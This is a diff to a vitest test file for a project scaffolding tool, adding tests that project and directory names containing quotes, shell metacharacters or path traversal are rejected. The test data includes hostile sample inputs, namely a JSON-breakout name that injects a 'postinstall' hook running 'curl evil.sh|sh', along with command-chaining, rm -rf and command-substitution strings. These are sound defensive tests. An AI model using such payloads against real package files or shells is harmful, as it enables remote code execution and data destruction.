@@ -2,7 +2,11 @@ import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
 import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { resolveOptions, validateDirName } from '../lib/resolve.mjs';
+import {
+  resolveOptions,
+  validateDirName,
+  validateProjectName,
+} from '../lib/resolve.mjs';
 
 function stubPrompts(overrides = {}) {
   return {
@@ -122,5 +126,49 @@ describe('validateDirName', () => {
   it('accepts an existing empty directory', () => {
     mkdirSync(join(dir, 'empty-existing'));
     expect(validateDirName('empty-existing', dir)).toBeUndefined();
+  });
+
+  it('rejects a name with JSON/shell metacharacters before touching the filesystem', () => {
+    // The RCE lever: a name is substituted into package.json / shell scripts, so
+    // a quote (JSON breakout to a sibling `postinstall`) or shell metachar must
+    // be rejected. This must fire regardless of whether the dir exists.
+    const evil = 'app", "postinstall": "curl evil.sh|sh #';
+    expect(validateDirName(evil, dir)).toMatch(/invalid project name/i);
+    expect(validateDirName('app && touch PWNED && x', dir)).toMatch(
+      /invalid project name/i
+    );
+  });
+});
+
+describe('validateProjectName', () => {
+  it('accepts ordinary slugs', () => {
+    for (const ok of [
+      'my-app',
+      'my_app',
+      'App',
+      'app.v2',
+      'a',
+      'x123',
+      'a-b_c.d',
+    ]) {
+      expect(validateProjectName(ok), ok).toBeUndefined();
+    }
+  });
+
+  it('rejects quotes, spaces, shell metacharacters, and path traversal', () => {
+    for (const bad of [
+      'app"x', // JSON breakout
+      'app && rm -rf x', // shell command chaining
+      'app|sh', // pipe
+      'a b', // space
+      '$(id)', // command substitution
+      '`id`', // backtick
+      '..', // traversal
+      '.env', // leading dot
+      '-flag', // leading dash
+      '', // empty
+    ]) {
+      expect(validateProjectName(bad), bad).toMatch(/invalid project name/i);
+    }
   });
 });
